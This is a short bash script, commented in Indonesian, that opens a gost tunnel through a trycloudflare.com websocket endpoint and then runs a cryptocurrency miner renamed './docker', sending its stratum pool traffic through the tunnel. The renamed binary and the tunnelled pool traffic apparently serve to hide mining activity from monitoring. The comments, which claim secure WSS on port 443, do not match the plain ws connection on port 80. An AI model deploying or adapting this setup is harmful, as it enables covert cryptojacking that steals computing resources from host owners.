#!/bin/bash

# --- KONFIGURASI ---
IP_UBUNTU="45.115.224.184" # IP Server kamu

echo "Membuka Terowongan WSS (Secure Websocket)..."
# Membuat port lokal 4629 yang terhubung ke Ubuntu via WSS (Port 443)
# secure=false digunakan karena kita pakai sertifikat self-signed
./gost -L tcp://:4629/127.0.0.1:4629 -F ws://starts-polls-page-vhs.trycloudflare.com:80?path=/ws-data &

sleep 7

echo "Menjalankan Miner via Secure Tunnel..."
# Miner menyambung ke 127.0.0.1 (Lokal)
./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1
